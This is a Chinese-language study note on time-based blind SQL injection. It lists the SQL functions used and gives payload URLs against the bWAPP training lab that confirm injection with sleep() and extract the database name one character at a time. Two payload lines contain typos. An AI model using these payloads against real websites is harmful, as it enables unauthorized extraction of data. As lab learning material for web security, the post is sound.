---
title: 《Web攻防安全实战》学习总结：SQL注入实战——利用时间盲注绕过无报错无回显场景
date: 2021-01-08 22:02:24
index_img: /img/websecurity.png
banner_img: /img/websecurity.png
tags:
  - 安全
  - Web安全
categories:
  - Web安全
  - SQL注入
---
# 时间盲注
## 时间盲注常用函数

```
substr（a,b,c）：从b位置开始，截取字符串a的c长度
count（）：计算总数
ascii（）：返回字符的ASCII码
length（）：返回字符串的长度
left（a,b）：从左到右截取字符串a的前b个字符
sleep（n）：将程序挂起n秒
```

## 时间盲注实战

World War Z电影存在
```
# 判断是否存在时间盲注
http://bwapp.com:8888/sqli_15.php?title=World War Z' and sleep(2)-- &action=search
# 判断数据库名长度
http://bwapp.com:8888/sqli_15.php?title=World War Z' and length(database()) > 5 and sleep(2)-- &action=search
# 利用substr函数遍历数据库名称字符，比如下面通过时间盲注判断数据库的第一个字符是不是b
http://bwapp.com:8888/sqli_15.php?title=World War Z' and substr(database(),1,1) = 'b' and sleep(2)-- &action=search
# 自动化检测
# 通过程序比较，数字的运算会更加快速方便，将字符串转换为ascii码进行对比
http://bwapp.com:8888/sqli_15.php?title=World War Z' and ascii(substr(database(),1,1))=1 and sl eep(2)-- aaction=search
http://bwapp.com:8888/sqli_15.php?title=World War Z' and ascii(substr(database(),1,1))=98 and sleep(2)-- aaction=search
# 自动化遍历数据库名、内容脚本
```
![fileupload](/img/sql/timebase/timebase1.png)
![fileupload](/img/sql/timebase/timebase2.png)
